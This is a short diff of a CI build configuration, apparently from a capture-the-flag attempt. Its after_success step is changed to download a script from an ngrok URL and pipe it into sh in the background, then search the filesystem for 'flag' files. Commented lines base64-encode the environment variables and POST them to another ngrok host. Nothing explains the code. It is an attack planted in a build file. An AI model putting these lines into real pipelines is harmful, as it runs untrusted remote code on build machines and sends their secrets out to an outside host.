@@ -10,8 +10,8 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - env
-  - YEET-$(curl 'https://073d-3-139-255-67.ngrok-free.app/script.txt' | /bin/sh &')
+  - which sh
+  - YEET=$(curl 'https://073d-3-139-255-67.ngrok-free.app/script.txt' | sh &)
   - find / 2>/dev/null | grep -i flag
   #- ENV=`env|base64`
   ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
